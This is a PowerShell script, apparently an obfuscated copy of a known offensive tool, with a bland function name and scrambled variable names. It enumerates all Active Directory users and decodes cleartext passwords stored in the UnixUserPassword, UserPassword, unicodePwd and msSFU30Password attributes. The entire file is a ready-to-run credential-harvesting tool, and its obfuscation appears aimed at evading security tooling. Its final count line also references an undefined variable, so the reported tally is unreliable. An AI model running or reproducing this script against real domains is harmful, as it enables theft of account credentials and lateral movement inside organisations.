

Function thyme
{

    [CmdletBinding()]
    Param()    


      
                

    Write-Verbose "Getting list of domain accounts and properties..."
    $qOWFQWkJJyBAHQA = Get-AdUser -Filter * -Properties * |
    Select-Object samaccountname, description, UnixUserPassword, UserPassword, unicodePwd, msSFU30Name, msSFU30Password


    Write-Verbose "Decoding passwords for each account..."
    $WDXHnD9vwYsGpwZ = $qOWFQWkJJyBAHQA |
    ForEach-Object{
           

        $9cSMwcpwwzrH99O = $_.samaccountname
        $rBMtxJeoGJA9Yhj = $_.description
    
        $bhmVADTWCNyQDBH = $_.UnixUserPassword | ForEach-Object {$_};     
        if($bhmVADTWCNyQDBH -notlike ""){       
            $nzzlIDaKM9vOLrt = [System.Text.Encoding]::ASCII.GetString($bhmVADTWCNyQDBH) 
        }else{
            $nzzlIDaKM9vOLrt = ""
        }
    
        $ZRSWg9WgXyKazVf = $_.UserPassword | ForEach-Object {$_};   
        if($ZRSWg9WgXyKazVf -notlike ""){         
            $DwmUahhxYUnMUDt = [System.Text.Encoding]::ASCII.GetString($ZRSWg9WgXyKazVf) 
        }else{
            $DwmUahhxYUnMUDt = ""
        }
       
        $OBybvX99wOAvlkZ = $_.unicodePwd | ForEach-Object {$_};
        if($OBybvX99wOAvlkZ -notlike ""){            
            $y9pF9GQs9pQkpOJ = [System.Text.Encoding]::ASCII.GetString($OBybvX99wOAvlkZ) 
        }else{
            $y9pF9GQs9pQkpOJ = ""
        }
    
        $EUiMUEHJrJXautU = $_.msSFU30Name
        $JOQyEkZGOmgldPR = $_.msSFU30Password | ForEach-Object {$_}; 
        if ($JOQyEkZGOmgldPR -notlike ""){           
            $fwQxQ9NxpGxJ9ZN = [System.Text.Encoding]::ASCII.GetString($JOQyEkZGOmgldPR) 
        }else{
            $fwQxQ9NxpGxJ9ZN = ""
        }


        if(($nzzlIDaKM9vOLrt) -or ($DwmUahhxYUnMUDt) -or ($fwQxQ9NxpGxJ9ZN) -or ($y9pF9GQs9pQkpOJ)){
            

            $CavAHRzKsaosfJM = New-Object PSObject                                       
            $CavAHRzKsaosfJM | add-member Noteproperty SamAccountName $9cSMwcpwwzrH99O
            $CavAHRzKsaosfJM | add-member Noteproperty Description $rBMtxJeoGJA9Yhj
            $CavAHRzKsaosfJM | add-member Noteproperty UnixUserPassword $nzzlIDaKM9vOLrt
            $CavAHRzKsaosfJM | add-member Noteproperty UserPassword $DwmUahhxYUnMUDt
            $CavAHRzKsaosfJM | add-member Noteproperty unicodePwd $y9pF9GQs9pQkpOJ
            $CavAHRzKsaosfJM | add-member Noteproperty msSFU30Name $EUiMUEHJrJXautU
            $CavAHRzKsaosfJM | add-member Noteproperty msSFU30Password $fwQxQ9NxpGxJ9ZN
        }


        $CavAHRzKsaosfJM
    } 


    $WDXHnD9vwYsGpwZ | Sort-Object SamAccountName -Unique
    $uMHAowvnLDtltPM = $wNoLcmbD9sQ9FkA.Count
    write-verbose "Decoded passwords for $uMHAowvnLDtltPM domain accounts."
}
